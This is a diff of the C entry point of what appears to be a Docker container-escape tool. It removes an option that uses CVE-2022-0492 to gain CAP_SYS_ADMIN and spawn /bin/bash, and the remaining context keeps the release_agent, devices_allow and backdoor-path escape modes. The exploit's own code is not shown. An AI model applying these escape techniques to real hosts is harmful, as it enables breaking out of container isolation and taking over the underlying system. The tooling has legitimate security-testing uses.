@@ -1,7 +1,6 @@
 #define _GNU_SOURCE
 
 #include "docker/capability.h"
-#include "exploits/cve_2022_0492.h"
 #include <time.h>
 #include <stdlib.h>
 #include <string.h>
@@ -14,29 +13,12 @@
 #include "util/utils.h"
 #include <getopt.h>
 #include <stdio.h>
-#include <unistd.h>
 #include "docker/security.h"
 
 #include "docker/cgroup.h"
 #include "exploits/devices_allow.h"
 
 #define DEFAULT_INPUT_BUFFER_SIZE 1024
-
-int cap_sys_admin_check() {
-    int sys_admin = check_cap_sys_admin();
-    if (sys_admin == 0) {
-        printf_wrapper(INFO, "Try to use CVE-2022-0492 to get CAP_SYS_ADMIN\n");
-        int result = cve_2022_0294();
-        if (result == 0) {
-            printf_wrapper(INFO, "No CAP_SYS_ADMIN capability, use CVE_2022_0492 failed\n");
-            return -1;
-        } else {
-            release_agent_attack_info.use_cve_2022_0492 = 1;
-        }
-    }
-    return 0;
-}
-
 
 int main(int argc, char *argv[]) {
 
@@ -52,7 +34,6 @@ int main(int argc, char *argv[]) {
             {"version",        no_argument,       NULL, 'v'},
             {"release-agent",  no_argument,       NULL, 'r'},
             {"devices-allow",  no_argument,       NULL, 'd'},
-            {"cve-2022-0492",  no_argument,       NULL, 'u'},
             {"container_path", required_argument, NULL, 'p'},
             {"mode",           required_argument, NULL, 'm'},
             {"command",        required_argument, NULL, 'c'},
@@ -115,10 +96,6 @@ int main(int argc, char *argv[]) {
                 break;
             case 'B':
                 attack_info.backdoor_path = optarg;
-                break;
-            case 'u':
-                attack_info.attack_type = CVE_2022_0492;
-                attack_info.attack_mode = SHELL;
                 break;
             case 'y':
                 assumeyes = 1;
@@ -194,10 +171,6 @@ int main(int argc, char *argv[]) {
     switch (attack_info.attack_type) {
         case RELEASE_AGENT: {
             release_agent_attack_info.use_cve_2022_0492 = 0;
-            if (cap_sys_admin_check() == -1) {
-                printf_wrapper(ERROR,
-                               "Current process don't have CAP_SYS_ADMIN capability，can't escape by using release_agent\n");
-            }
             release_agent_attack_info.container_path_in_host = (char *) malloc(1024 * sizeof(char));
             memset(release_agent_attack_info.container_path_in_host, 0x00, 1024);
             if (attack_info.container_path[0] == 0x00) {
@@ -293,32 +266,6 @@ int main(int argc, char *argv[]) {
                 } else {
                     printf_wrapper(ERROR, "Escape by device_allow failed\n");
                 }
-            }
-            break;
-        }
-        case CVE_2022_0492: {
-            int sys_admin = check_cap_sys_admin();
-            if (sys_admin == 0) {
-                printf_wrapper(INFO, "Try to attack by CVE-2022-0492 to get CAP_SYS_ADMIN\n");
-                int result = cve_2022_0294();
-                if (result == 0) {
-                    printf_wrapper(INFO, "Attack by CVE_2022_0492 failed\n");
-                } else {
-                    printf_wrapper(INFO, "Attack by CVE_2022_0492 success\n");
-                    char *bash_args[] = {
-                            "/bin/bash",
-                            NULL
-                    };
-                    int ret = execvp(bash_args[0], bash_args);
-                    if (ret == -1) {
-                        exit(EXIT_SUCCESS);
-                    } else {
-                        printf_wrapper(INFO, "New process id: %d", ret);
-                    }
-                }
-            } else {
-                printf_wrapper(INFO,
-                               "Current process already has CAP_SYS_ADMIN capability, no need to use CVE_2022_0492\n");
             }
             break;
         }
